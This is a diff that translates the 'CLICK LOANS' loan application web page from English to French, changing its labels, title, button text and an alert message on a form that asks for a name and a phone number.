@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Form</title>
+<title>Formulaire de demande de prêt</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -55,7 +55,6 @@ button:disabled { background: #ccc; }
     height: 18px;
     accent-color: blue;
 }
-
 </style>
 </head>
 <body>
@@ -65,28 +64,28 @@ button:disabled { background: #ccc; }
      <h1>CLICK LOANS</h1>   
     </div>
 
-    <h2> Loan Application Form</h2>
+    <h2>Formulaire de demande de prêt</h2>
 
     <form id="detailsForm">
-        <label>Full Name</label>
-        <input id="name" placeholder="Name" required>
+        <label>Nom complet</label>
+        <input id="name" placeholder="Nom" required>
 
-        <label>Phone Number</label>
+        <label>Numéro de téléphone</label>
         <input id="phone" placeholder="+263" required>
 
         <label class="checkbox-label">
             <input type="checkbox" id="confirmCheck">
-            I agree to the terms and services of Click Loans
+            J'accepte les termes et services de Click Loans
         </label>
 
-        <button id="nextBtn" disabled>Continue</button>
+        <button id="nextBtn" disabled>Continuer</button>
     </form>
 </div>
 
 <script>
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
-if (!botId) { alert("Invalid access link"); throw new Error(); }
+if (!botId) { alert("Lien d'accès invalide"); throw new Error(); }
 
 if (!localStorage.getItem('loanAmount')) {
     window.location.href = `index.html?botId=${botId}`;
